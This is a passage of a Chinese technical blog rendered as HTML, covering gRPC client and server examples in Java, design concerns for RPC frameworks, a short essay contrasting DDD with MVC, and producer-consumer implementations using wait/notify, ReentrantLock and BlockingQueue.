class=\"name\">groupId</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">artifactId</span>&gt;</span>grpc<span class=\"tag\">&lt;/<span class=\"name\">artifactId</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">version</span>&gt;</span>0.0.1-SNAPSHOT<span class=\"tag\">&lt;/<span class=\"name\">version</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">scope</span>&gt;</span>compile<span class=\"tag\">&lt;/<span class=\"name\">scope</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<p>编写GRPCClient</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">GRPCClient</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"keyword\">static</span> <span class=\"keyword\">final</span> <span class=\"type\">String</span> <span class=\"variable\">host</span> <span class=\"operator\">=</span> <span class=\"string\">&quot;localhost&quot;</span>;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"keyword\">static</span> <span class=\"keyword\">final</span> <span class=\"type\">int</span> <span class=\"variable\">serverPort</span> <span class=\"operator\">=</span> <span class=\"number\">9999</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title function_\">main</span><span class=\"params\">( String[] args )</span> <span class=\"keyword\">throws</span> Exception &#123;</span><br><span class=\"line\">        <span class=\"type\">ManagedChannel</span> <span class=\"variable\">managedChannel</span> <span class=\"operator\">=</span> ManagedChannelBuilder.forAddress( host, serverPort ).usePlaintext().build();</span><br><span class=\"line\">        <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">            RPCDateServiceGrpc.<span class=\"type\">RPCDateServiceBlockingStub</span> <span class=\"variable\">rpcDateService</span> <span class=\"operator\">=</span> RPCDateServiceGrpc.newBlockingStub( managedChannel );</span><br><span class=\"line\">            <span class=\"type\">RPCDateRequest</span> <span class=\"variable\">rpcDateRequest</span> <span class=\"operator\">=</span> RPCDateRequest</span><br><span class=\"line\">                    .newBuilder()</span><br><span class=\"line\">                    .setUserName(<span class=\"string\">&quot;shgx&quot;</span>)</span><br><span class=\"line\">                    .build();</span><br><span class=\"line\">            <span class=\"type\">RPCDateResponse</span> <span class=\"variable\">rpcDateResponse</span> <span class=\"operator\">=</span> rpcDateService.getDate( rpcDateRequest );</span><br><span class=\"line\">            System.out.println( rpcDateResponse.getServerDate() );</span><br><span class=\"line\">        &#125; <span class=\"keyword\">finally</span> &#123;</span><br><span class=\"line\">            managedChannel.shutdown();</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<h4 id=\"server\"><a href=\"#server\" class=\"headerlink\" title=\"server\"></a>server</h4><p><img src=\"/./2024/05/26/%E5%9C%BA%E6%99%AF%E8%AE%BE%E8%AE%A1%E9%9D%A2%E8%AF%95%E9%A2%98/9.png\"></p>\n<p>按照2.2.3 client的方式添加依赖</p>\n<p>创建RPCDateServiceImpl</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">RPCDateServiceImpl</span> <span class=\"keyword\">extends</span> <span class=\"title class_\">RPCDateServiceGrpc</span>.RPCDateServiceImplBase&#123;</span><br><span class=\"line\">    <span class=\"meta\">@Override</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">getDate</span><span class=\"params\">(RPCDateRequest request, StreamObserver&lt;RPCDateResponse&gt; responseObserver)</span> &#123;</span><br><span class=\"line\">        <span class=\"type\">RPCDateResponse</span> <span class=\"variable\">rpcDateResponse</span> <span class=\"operator\">=</span> <span class=\"literal\">null</span>;</span><br><span class=\"line\">        Date now=<span class=\"keyword\">new</span> <span class=\"title class_\">Date</span>();</span><br><span class=\"line\">        <span class=\"type\">SimpleDateFormat</span> <span class=\"variable\">simpleDateFormat</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">SimpleDateFormat</span>(<span class=\"string\">&quot;今天是&quot;</span>+<span class=\"string\">&quot;yyyy年MM月dd日 E kk点mm分&quot;</span>);</span><br><span class=\"line\">        <span class=\"type\">String</span> <span class=\"variable\">nowTime</span> <span class=\"operator\">=</span> simpleDateFormat.format( now );</span><br><span class=\"line\">        <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">            rpcDateResponse = RPCDateResponse</span><br><span class=\"line\">                    .newBuilder()</span><br><span class=\"line\">                    .setServerDate( <span class=\"string\">&quot;Welcome &quot;</span> + request.getUserName()  + <span class=\"string\">&quot;, &quot;</span> + nowTime )</span><br><span class=\"line\">                    .build();</span><br><span class=\"line\">        &#125; <span class=\"keyword\">catch</span> (Exception e) &#123;</span><br><span class=\"line\">            responseObserver.onError(e);</span><br><span class=\"line\">        &#125; <span class=\"keyword\">finally</span> &#123;</span><br><span class=\"line\">            responseObserver.onNext( rpcDateResponse );</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        responseObserver.onCompleted();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>创建GRPCServer</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">GRPCServer</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"keyword\">static</span> <span class=\"keyword\">final</span> <span class=\"type\">int</span> <span class=\"variable\">port</span> <span class=\"operator\">=</span> <span class=\"number\">9999</span>;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title function_\">main</span><span class=\"params\">( String[] args )</span> <span class=\"keyword\">throws</span> Exception &#123;</span><br><span class=\"line\">        <span class=\"type\">Server</span> <span class=\"variable\">server</span> <span class=\"operator\">=</span> ServerBuilder.</span><br><span class=\"line\">                forPort(port)</span><br><span class=\"line\">                .addService( <span class=\"keyword\">new</span> <span class=\"title class_\">RPCDateServiceImpl</span>() )</span><br><span class=\"line\">                .build().start();</span><br><span class=\"line\">        System.out.println( <span class=\"string\">&quot;grpc服务端启动成功, 端口=&quot;</span> + port );</span><br><span class=\"line\">        server.awaitTermination();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h2 id=\"一个优秀的RPC框架需要考虑的问题\"><a href=\"#一个优秀的RPC框架需要考虑的问题\" class=\"headerlink\" title=\"一个优秀的RPC框架需要考虑的问题\"></a>一个优秀的RPC框架需要考虑的问题</h2><ol>\n<li><code>微服务化</code>应用都基于微服务化，实现资源调用离不开远程调用</li>\n<li><code>多实例问题</code> 一个服务可能有多个实例，你在调用时，要如何获取这些实例的地址呢？— 这时候就需要一个服务注册中心，从服务注册中心获取服务的实例列表，再从中选择一个进行调用。</li>\n<li><code>负载均衡</code> 选哪个调用好呢？这时候就需要负载均衡了，于是又得考虑如何实现复杂均衡</li>\n<li><code>缓存</code> 总不能每次调用时都去注册中心查询实例列表吧，这样效率多低呀，于是又有了缓存，有了缓存，就要考虑缓存的更新问题</li>\n<li><code>异步调用</code> 客户端总不能每次调用完都干等着服务端返回数据吧,于是就要支持异步调用;<ul>\n<li>Future实现</li>\n</ul>\n</li>\n<li><code>版本控制</code> 服务端的接口修改了，老的接口还有人在用，怎么办？总不能让他们都改了吧？这就需要版本控制了；</li>\n<li><code>线程池</code> 服务端总不能每次接到请求都马上启动一个线程去处理吧？于是就需要线程池；</li>\n<li><code>未处理完的请求</code> 服务端关闭时，还没处理完的请求怎么办？是直接结束呢，还是等全部请求处理完再关闭呢？</li>\n</ol>\n<h2 id=\"什么是DDD？\"><a href=\"#什么是DDD？\" class=\"headerlink\" title=\"什么是DDD？\"></a>什么是DDD？</h2><h3 id=\"MVC\"><a href=\"#MVC\" class=\"headerlink\" title=\"MVC\"></a>MVC</h3><p>要说DDD，不得不先看看MVC，我相信基本上99%的java开发读者，不管你是计科专业出身还是跨专业，初学spring或者springboot的时候，接触到的代码分层都是MVC<br>这说明了MVC有它自身独有的优势：</p>\n<ul>\n<li>开发人员可以只关注整个结构中的其中某一层；</li>\n<li>可以很容易的用新的实现来替换原有层次的实现；</li>\n<li>可以降低层与层之间的依赖；</li>\n<li>有利于标准化；</li>\n<li>利于各层逻辑的复用。</li>\n</ul>\n<p>但是真实情况是这样吗？随着你系统功能迭代，业务逻辑越来越复杂之后。MVC三层中，V层作为数据载体，C层作为逻辑路由都是很薄的一层，大量的代码都堆积在了M层（模型层）。一个service的类，动辄几百上千行，大的甚至几万行，逻辑嵌套复杂，主业务逻辑不清晰。service做的稍微轻量化一点的，代码就像是胶水，把数据库执行逻辑与控制返回给前端的逻辑胶在一起，主次不清晰。<br>一看你的工程，类啊，代码量啊都不少，你甚至不知道如何入手去修改“屎山”一样的代码。</p>\n<h3 id=\"那么DDD为什么可以去解决以上的问题呢？\"><a href=\"#那么DDD为什么可以去解决以上的问题呢？\" class=\"headerlink\" title=\"那么DDD为什么可以去解决以上的问题呢？\"></a>那么DDD为什么可以去解决以上的问题呢？</h3><p>DDD核心思想是什么呢？解耦！让业务不是像炒大锅饭一样混在一起，而是一道道工序复杂的美食，都有他们自己独立的做法。</p>\n<p>DDD的价值观里面，任何业务都是某个业务领域模型的职责体现。A领域只会去做A领域的事情，A领域想去修改B领域，需要找中介（防腐层）去对B领域完成操作。我想完成一个很长的业务逻辑动作，在划分好业务边界之后，交给业务服务的编排者（应用服务）去组织业务模型（聚合）完成逻辑。</p>\n<p>这样，每个服务（领域）只会做自己业务边界内的事情，最小细粒度的去定义需求的实现。原先空空的贫血模型摇身一变变成了充血模型。原理冗长的service里面类似到处set，get值这种与业务逻辑无关的数据载体包装代码，都会被去除，进到应用服务层，你的代码就是你的业务逻辑。逻辑清晰，可维护性高！</p>\n<h3 id=\"什么样的系统适配DDD\"><a href=\"#什么样的系统适配DDD\" class=\"headerlink\" title=\"什么样的系统适配DDD\"></a>什么样的系统适配DDD</h3><p>中小规模的系统，本身业务体量小，功能单一，选择mvc架构无疑是最好的。 项目化交付的系统，研发周期短，一天到晚按照甲方的需求定制功能。</p>\n<p>中大规模系统，产品化模式，业务可持续迭代，可预见的业务逻辑复杂性的系统。</p>\n<h3 id=\"DDD的代码怎么做\"><a href=\"#DDD的代码怎么做\" class=\"headerlink\" title=\"DDD的代码怎么做\"></a>DDD的代码怎么做</h3><p>&#x2F;&#x2F; TODO</p>\n<h2 id=\"Java实现生产者消费者\"><a href=\"#Java实现生产者消费者\" class=\"headerlink\" title=\"Java实现生产者消费者\"></a>Java实现生产者消费者</h2><h3 id=\"wait-和notify-方法的实现\"><a href=\"#wait-和notify-方法的实现\" class=\"headerlink\" title=\"wait()和notify()方法的实现\"></a>wait()和notify()方法的实现</h3><figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">Test1</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"keyword\">static</span> <span class=\"type\">Integer</span> <span class=\"variable\">count</span> <span class=\"operator\">=</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"keyword\">static</span> <span class=\"keyword\">final</span> <span class=\"type\">Integer</span> <span class=\"variable\">FULL</span> <span class=\"operator\">=</span> <span class=\"number\">10</span>;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"keyword\">static</span> <span class=\"type\">String</span> <span class=\"variable\">LOCK</span> <span class=\"operator\">=</span> <span class=\"string\">&quot;lock&quot;</span>;</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title function_\">main</span><span class=\"params\">(String[] args)</span> &#123;</span><br><span class=\"line\">        <span class=\"type\">Test1</span> <span class=\"variable\">test1</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">Test1</span>();</span><br><span class=\"line\">        <span class=\"keyword\">new</span> <span class=\"title class_\">Thread</span>(test1.<span class=\"keyword\">new</span> <span class=\"title class_\">Producer</span>()).start();</span><br><span class=\"line\">        <span class=\"keyword\">new</span> <span class=\"title class_\">Thread</span>(test1.<span class=\"keyword\">new</span> <span class=\"title class_\">Consumer</span>()).start();</span><br><span class=\"line\">        <span class=\"keyword\">new</span> <span class=\"title class_\">Thread</span>(test1.<span class=\"keyword\">new</span> <span class=\"title class_\">Producer</span>()).start();</span><br><span class=\"line\">        <span class=\"keyword\">new</span> <span class=\"title class_\">Thread</span>(test1.<span class=\"keyword\">new</span> <span class=\"title class_\">Consumer</span>()).start();</span><br><span class=\"line\">        <span class=\"keyword\">new</span> <span class=\"title class_\">Thread</span>(test1.<span class=\"keyword\">new</span> <span class=\"title class_\">Producer</span>()).start();</span><br><span class=\"line\">        <span class=\"keyword\">new</span> <span class=\"title class_\">Thread</span>(test1.<span class=\"keyword\">new</span> <span class=\"title class_\">Consumer</span>()).start();</span><br><span class=\"line\">        <span class=\"keyword\">new</span> <span class=\"title class_\">Thread</span>(test1.<span class=\"keyword\">new</span> <span class=\"title class_\">Producer</span>()).start();</span><br><span class=\"line\">        <span class=\"keyword\">new</span> <span class=\"title class_\">Thread</span>(test1.<span class=\"keyword\">new</span> <span class=\"title class_\">Consumer</span>()).start();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">class</span> <span class=\"title class_\">Producer</span> <span class=\"keyword\">implements</span> <span class=\"title class_\">Runnable</span> &#123;</span><br><span class=\"line\">        <span class=\"meta\">@Override</span></span><br><span class=\"line\">        <span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">run</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">            <span class=\"keyword\">for</span> (<span class=\"type\">int</span> <span class=\"variable\">i</span> <span class=\"operator\">=</span> <span class=\"number\">0</span>; i &lt; <span class=\"number\">10</span>; i++) &#123;</span><br><span class=\"line\">                <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">                    Thread.sleep(<span class=\"number\">3000</span>);</span><br><span class=\"line\">                &#125; <span class=\"keyword\">catch</span> (Exception e) &#123;</span><br><span class=\"line\">                    e.printStackTrace();</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">                <span class=\"keyword\">synchronized</span> (LOCK) &#123;</span><br><span class=\"line\">                    <span class=\"keyword\">while</span> (count == FULL) &#123;</span><br><span class=\"line\">                        <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">                            LOCK.wait();</span><br><span class=\"line\">                        &#125; <span class=\"keyword\">catch</span> (Exception e) &#123;</span><br><span class=\"line\">                            e.printStackTrace();</span><br><span class=\"line\">                        &#125;</span><br><span class=\"line\">                    &#125;</span><br><span class=\"line\">                    count++;</span><br><span class=\"line\">                    System.out.println(Thread.currentThread().getName() + <span class=\"string\">&quot;生产者生产，目前总共有&quot;</span> + count);</span><br><span class=\"line\">                    LOCK.notifyAll();</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">class</span> <span class=\"title class_\">Consumer</span> <span class=\"keyword\">implements</span> <span class=\"title class_\">Runnable</span> &#123;</span><br><span class=\"line\">        <span class=\"meta\">@Override</span></span><br><span class=\"line\">        <span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">run</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">            <span class=\"keyword\">for</span> (<span class=\"type\">int</span> <span class=\"variable\">i</span> <span class=\"operator\">=</span> <span class=\"number\">0</span>; i &lt; <span class=\"number\">10</span>; i++) &#123;</span><br><span class=\"line\">                <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">                    Thread.sleep(<span class=\"number\">3000</span>);</span><br><span class=\"line\">                &#125; <span class=\"keyword\">catch</span> (InterruptedException e) &#123;</span><br><span class=\"line\">                    e.printStackTrace();</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">                <span class=\"keyword\">synchronized</span> (LOCK) &#123;</span><br><span class=\"line\">                    <span class=\"keyword\">while</span> (count == <span class=\"number\">0</span>) &#123;</span><br><span class=\"line\">                        <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">                            LOCK.wait();</span><br><span class=\"line\">                        &#125; <span class=\"keyword\">catch</span> (Exception e) &#123;</span><br><span class=\"line\">                        &#125;</span><br><span class=\"line\">                    &#125;</span><br><span class=\"line\">                    count--;</span><br><span class=\"line\">                    System.out.println(Thread.currentThread().getName() + <span class=\"string\">&quot;消费者消费，目前总共有&quot;</span> + count);</span><br><span class=\"line\">                    LOCK.notifyAll();</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h3 id=\"可重入锁ReentrantLock的实现\"><a href=\"#可重入锁ReentrantLock的实现\" class=\"headerlink\" title=\"可重入锁ReentrantLock的实现\"></a>可重入锁ReentrantLock的实现</h3><figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">Test2</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"keyword\">static</span> <span class=\"type\">Integer</span> <span class=\"variable\">count</span> <span class=\"operator\">=</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"keyword\">static</span> <span class=\"keyword\">final</span> <span class=\"type\">Integer</span> <span class=\"variable\">FULL</span> <span class=\"operator\">=</span> <span class=\"number\">10</span>;</span><br><span class=\"line\">    <span class=\"comment\">//创建一个锁对象</span></span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"type\">Lock</span> <span class=\"variable\">lock</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">ReentrantLock</span>();</span><br><span class=\"line\">    <span class=\"comment\">//创建两个条件变量，一个为缓冲区非满，一个为缓冲区非空</span></span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"keyword\">final</span> <span class=\"type\">Condition</span> <span class=\"variable\">notFull</span> <span class=\"operator\">=</span> lock.newCondition();</span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"keyword\">final</span> <span class=\"type\">Condition</span> <span class=\"variable\">notEmpty</span> <span class=\"operator\">=</span> lock.newCondition();</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title function_\">main</span><span class=\"params\">(String[] args)</span> &#123;</span><br><span class=\"line\">        <span class=\"type\">Test2</span> <span class=\"variable\">test2</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">Test2</span>();</span><br><span class=\"line\">        <span class=\"keyword\">new</span> <span class=\"title class_\">Thread</span>(test2.<span class=\"keyword\">new</span> <span class=\"title class_\">Producer</span>()).start();</span><br><span class=\"line\">        <span class=\"keyword\">new</span> <span class=\"title class_\">Thread</span>(test2.<span class=\"keyword\">new</span> <span class=\"title class_\">Consumer</span>()).start();</span><br><span class=\"line\">        <span class=\"keyword\">new</span> <span class=\"title class_\">Thread</span>(test2.<span class=\"keyword\">new</span> <span class=\"title class_\">Producer</span>()).start();</span><br><span class=\"line\">        <span class=\"keyword\">new</span> <span class=\"title class_\">Thread</span>(test2.<span class=\"keyword\">new</span> <span class=\"title class_\">Consumer</span>()).start();</span><br><span class=\"line\">        <span class=\"keyword\">new</span> <span class=\"title class_\">Thread</span>(test2.<span class=\"keyword\">new</span> <span class=\"title class_\">Producer</span>()).start();</span><br><span class=\"line\">        <span class=\"keyword\">new</span> <span class=\"title class_\">Thread</span>(test2.<span class=\"keyword\">new</span> <span class=\"title class_\">Consumer</span>()).start();</span><br><span class=\"line\">        <span class=\"keyword\">new</span> <span class=\"title class_\">Thread</span>(test2.<span class=\"keyword\">new</span> <span class=\"title class_\">Producer</span>()).start();</span><br><span class=\"line\">        <span class=\"keyword\">new</span> <span class=\"title class_\">Thread</span>(test2.<span class=\"keyword\">new</span> <span class=\"title class_\">Consumer</span>()).start();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">class</span> <span class=\"title class_\">Producer</span> <span class=\"keyword\">implements</span> <span class=\"title class_\">Runnable</span> &#123;</span><br><span class=\"line\">        <span class=\"meta\">@Override</span></span><br><span class=\"line\">        <span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">run</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">            <span class=\"keyword\">for</span> (<span class=\"type\">int</span> <span class=\"variable\">i</span> <span class=\"operator\">=</span> <span class=\"number\">0</span>; i &lt; <span class=\"number\">10</span>; i++) &#123;</span><br><span class=\"line\">                <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">                    Thread.sleep(<span class=\"number\">3000</span>);</span><br><span class=\"line\">                &#125; <span class=\"keyword\">catch</span> (Exception e) &#123;</span><br><span class=\"line\">                    e.printStackTrace();</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">                <span class=\"comment\">//获取锁</span></span><br><span class=\"line\">                lock.lock();</span><br><span class=\"line\">                <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">                    <span class=\"keyword\">while</span> (count == FULL) &#123;</span><br><span class=\"line\">                        <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">                            notFull.await();</span><br><span class=\"line\">                        &#125; <span class=\"keyword\">catch</span> (InterruptedException e) &#123;</span><br><span class=\"line\">                            e.printStackTrace();</span><br><span class=\"line\">                        &#125;</span><br><span class=\"line\">                    &#125;</span><br><span class=\"line\">                    count++;</span><br><span class=\"line\">                    System.out.println(Thread.currentThread().getName()</span><br><span class=\"line\">                            + <span class=\"string\">&quot;生产者生产，目前总共有&quot;</span> + count);</span><br><span class=\"line\">                    <span class=\"comment\">//唤醒消费者</span></span><br><span class=\"line\">                    notEmpty.signal();</span><br><span class=\"line\">                &#125; <span class=\"keyword\">finally</span> &#123;</span><br><span class=\"line\">                    <span class=\"comment\">//释放锁</span></span><br><span class=\"line\">                    lock.unlock();</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">class</span> <span class=\"title class_\">Consumer</span> <span class=\"keyword\">implements</span> <span class=\"title class_\">Runnable</span> &#123;</span><br><span class=\"line\">        <span class=\"meta\">@Override</span></span><br><span class=\"line\">        <span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">run</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">            <span class=\"keyword\">for</span> (<span class=\"type\">int</span> <span class=\"variable\">i</span> <span class=\"operator\">=</span> <span class=\"number\">0</span>; i &lt; <span class=\"number\">10</span>; i++) &#123;</span><br><span class=\"line\">                <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">                    Thread.sleep(<span class=\"number\">3000</span>);</span><br><span class=\"line\">                &#125; <span class=\"keyword\">catch</span> (InterruptedException e1) &#123;</span><br><span class=\"line\">                    e1.printStackTrace();</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">                lock.lock();</span><br><span class=\"line\">                <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">                    <span class=\"keyword\">while</span> (count == <span class=\"number\">0</span>) &#123;</span><br><span class=\"line\">                        <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">                            notEmpty.await();</span><br><span class=\"line\">                        &#125; <span class=\"keyword\">catch</span> (Exception e) &#123;</span><br><span class=\"line\">                            e.printStackTrace();</span><br><span class=\"line\">                        &#125;</span><br><span class=\"line\">                    &#125;</span><br><span class=\"line\">                    count--;</span><br><span class=\"line\">                    System.out.println(Thread.currentThread().getName()</span><br><span class=\"line\">                            + <span class=\"string\">&quot;消费者消费，目前总共有&quot;</span> + count);</span><br><span class=\"line\">                    notFull.signal();</span><br><span class=\"line\">                &#125; <span class=\"keyword\">finally</span> &#123;</span><br><span class=\"line\">                    lock.unlock();</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h4 id=\"阻塞队列BlockingQueue的实现\"><a href=\"#阻塞队列BlockingQueue的实现\" class=\"headerlink\" title=\"阻塞队列BlockingQueue的实现\"></a>阻塞队列BlockingQueue的实现</h4><figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">Test3</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"keyword\">static</span> <span class=\"type\">Integer</span> <span class=\"variable\">count</span> <span class=\"operator\">=</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">    <span class=\"comment\">//创建一个阻塞队列</span></span><br><span class=\"line\">    <span class=\"keyword\">final</span> <span class=\"type\">BlockingQueue</span> <span class=\"variable\">blockingQueue</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">ArrayBlockingQueue</span>&lt;&gt;(<span class=\"number\">10</span>);</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title function_\">main</span><span class=\"params\">(String[] args)</span> &#123;</span><br><span class=\"line\">        <span class=\"type\">Test3</span> <span class=\"variable\">test3</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">Test3</span>();</span><br><span class=\"line\">        <span class=\"keyword\">new</span> <span class=\"title class_\">Thread</span>(test3.<span class=\"keyword\">new</span> <span class=\"title class_\">Producer</span>()).start();</span><br><span class=\"line\">        <span class=\"keyword\">new</span> <span class=\"title class_\">Thread</span>(test3.<span class=\"keyword\">new</span> <span class=\"title class_\">Consumer</span>()).start();</span><br><span class=\"line\">        <span class=\"keyword\">new</span> <span class=\"title class_\">Thread</span>(test3.<span class=\"keyword\">new</span> <span class=\"title class_\">Producer</span>()).start();</span><br><span class=\"line\">        <span class=\"keyword\">new</span> <span class=\"title class_\">Thread</span>(test3.<span class=\"keyword\">new</span> <span class=\"title class_\">Consumer</span>()).start();</span><br><span class=\"line\">        <span class=\"keyword\">new</span> <span class=\"title class_\">Thread</span>(test3.<span class=\"keyword\">new</span> <span class=\"title class_\">Producer</span>()).start();</span><br><span class=\"line\">        <span class=\"keyword\">new</span> <span class=\"title class_\">Thread</span>(test3.<span class=\"keyword\">new</span> <span class=\"title class_\">Consumer</span>()).start();</span><br><span class=\"line\">        <span class=\"keyword\">new</span> <span class=\"title class_\">Thread</span>(test3.<span class=\"keyword\">new</span> <span class=\"title class_\">Producer</span>()).start();</span><br><span class=\"line\">        <span class=\"keyword\">new</span> <span class=\"title class_\">Thread</span>(test3.<span class=\"keyword\">new</span> <span class=\"title class_\">Consumer</span>()).start();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">class</span> <span class=\"title class_\">Producer</span> <span class=\"keyword\">implements</span> <span class=\"title class_\">Runnable</span> &#123;</span><br><span class=\"line\">        <span class=\"meta\">@Override</span></span><br><span class=\"line\">        <span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">run</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">            <span class=\"keyword\">for</span> (<span class=\"type\">int</span> <span class=\"variable\">i</span> <span class=\"operator\">=</span> <span class=\"number\">0</span>; i &lt; <span class=\"number\">10</span>; i++) &#123;</span><br><span class=\"line\">                <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">                    Thread.sleep(<span class=\"number\">3000</span>);</span><br><span class=\"line\">                &#125; <span class=\"keyword\">catch</span> (Exception e) &#123;</span><br><span class=\"line\">                    e.printStackTrace();</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">                <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">                    blockingQueue.put(<span class=\"number\">1</span>);</span><br><span class=\"line\">                    count++;</span><br><span class=\"line\">                    System.out.println(Thread.currentThread().getName()</span><br><span class=\"line\">                            + <span class=\"string\">&quot;生产者生产，目前总共有&quot;</span> + count);</span><br><span class=\"line\">                &#125; <span class=\"keyword\">catch</span> (InterruptedException e) &#123;</span><br><span class=\"line\">                    e.printStackTrace();</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">class</span> <span class=\"title class_\">Consumer</span> <span class=\"keyword\">implements</span> <span class=\"title class_\">Runnable</span> &#123;</span><br><span class=\"line\">        <span class=\"meta\">@Override</span></span><br><span class=\"line\">        <span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">run</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">            <span class=\"keyword\">for</span> (<span class=\"type\">int</span> <span 